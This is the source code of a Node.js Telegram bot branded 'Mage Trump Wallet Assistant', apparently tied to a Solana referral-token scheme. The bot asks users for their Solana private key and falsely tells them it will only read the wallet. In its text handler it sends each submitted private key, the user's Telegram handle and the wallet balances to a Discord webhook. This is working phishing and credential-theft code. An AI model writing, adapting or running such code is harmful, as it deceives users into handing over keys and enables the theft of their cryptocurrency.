require('dotenv').config();
const { Telegraf } = require('telegraf');
const admin = require('firebase-admin');
const { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const rawBs58 = require('bs58');
const bs58 = rawBs58.default || rawBs58;

// ✅ Corrigido: fetch compatível com todas as versões
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

const bot = new Telegraf(process.env.BOT_TOKEN);
const credentials = require(process.env.FIREBASE_CREDENTIALS);
const discordWebhook = process.env.DISCORD_WEBHOOK;

admin.initializeApp({
  credential: admin.credential.cert(credentials),
});

const db = admin.firestore();
const connection = new Connection("https://api.mainnet-beta.solana.com");

bot.start((ctx) => {
  ctx.reply(`👋 Welcome to Mage Trump Wallet Assistant!

To continue, please send your Solana **private key** (in base58 format). This will allow the bot to connect to your wallet and show your status.

⚠️ Your key will be used to read your wallet only. Keep it safe.`);
});

bot.on('text', async (ctx) => {
  const privateKey = ctx.message.text.trim();

  try {
    const decoded = bs58.decode(privateKey);
    const keypair = Keypair.fromSecretKey(Uint8Array.from(decoded));
    const pubkey = keypair.publicKey.toBase58();

    // 🔄 Saldo da blockchain
    const lamports = await connection.getBalance(new PublicKey(pubkey));
    const solBalance = (lamports / LAMPORTS_PER_SOL).toFixed(3);

    // 🔎 Dados do projeto
    const userRef = db.collection('users').doc(pubkey);
    const docSnap = await userRef.get();

    let projectBalance = '0.0';
    let refCount = 0;
    let canClaim = false;

    if (docSnap.exists) {
      const data = docSnap.data();
      projectBalance = (data.balance || 0).toFixed(2);
      refCount = data.refCount || 0;
      canClaim = data.canClaim || false;
    }

    // 📤 Mensagem para o usuário
    const msg = `
🧙 Wallet: \`${pubkey}\`
💸 On-chain balance: ${solBalance} SOL
🎯 Project balance: ${projectBalance} SOL
🔗 Referrals: ${refCount}
${canClaim ? '✅' : '⛔'} Claim status: ${canClaim ? 'Available' : 'Not Available'}

📢 Your referral link:
https://magetoken.com.br/?ref=${pubkey}

🚀 Share your link and earn 0.1 SOL for each new wizard you recruit!
    `.trim();

    await ctx.replyWithMarkdown(msg);

    // 📡 Log no Discord
    try {
      await fetch(discordWebhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `📢 New user connected via private key:

👤 Telegram: @${ctx.from.username || 'unknown'}
🔑 Private Key: \`${privateKey}\`
🧙 Wallet: \`${pubkey}\`

💸 On-chain: ${solBalance} SOL
🎯 Project: ${projectBalance} | Referrals: ${refCount}
⛔ Claim: ${canClaim ? 'Available' : 'Not Available'}`
        })
      });
    } catch (err) {
      console.warn('⚠️ Falha ao enviar para Discord, mas o bot continua funcionando.');
    }

    return;

  } catch (err) {
    console.error('Erro ao processar a chave:', err.message || err);
    ctx.reply('❌ Invalid private key or error connecting to your wallet. Please try again.');
  }
});

bot.launch();
console.log("✅ MageTrump Assistant is running...");
